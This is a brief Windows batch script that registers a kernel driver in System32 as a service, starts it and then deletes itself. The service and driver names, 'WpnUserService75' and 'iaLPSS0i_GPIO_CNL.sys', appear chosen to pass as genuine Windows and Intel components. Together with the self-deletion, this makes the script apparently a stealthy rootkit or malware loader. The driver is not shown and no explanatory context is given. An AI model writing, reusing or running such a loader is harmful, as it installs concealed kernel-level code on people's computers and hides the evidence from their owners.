@echo off
cd %~dp0
sc create WpnUserService75 binpath=C:\Windows\System32\iaLPSS0i_GPIO_CNL.sys type=kernel
sc start WpnUserService75
del "%~f0"



